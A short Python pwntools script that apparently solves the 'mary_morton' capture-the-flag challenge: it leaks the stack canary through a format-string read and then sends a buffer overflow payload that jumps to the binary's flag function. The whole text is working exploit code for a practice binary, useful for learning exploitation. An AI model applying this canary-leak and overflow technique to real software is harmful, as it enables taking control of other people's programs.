from pwn import *
from time import sleep

 
elf = ELF('./mary_morton')
flag_addr = 0x04008DA
print_addr = elf.got['printf']
 

p=process('mary_morton')

print p.recv()
p.sendline("2")
p.sendline("%23$p")
sleep(1)
canary =int( p.recvuntil('\n',drop=True),16)
print hex(canary)

payload=0x88*'a'+p64(canary)+p64(0)+p64(flag_addr)

print p.recv()
p.sendline('1')
p.sendline(payload)
print p.recv()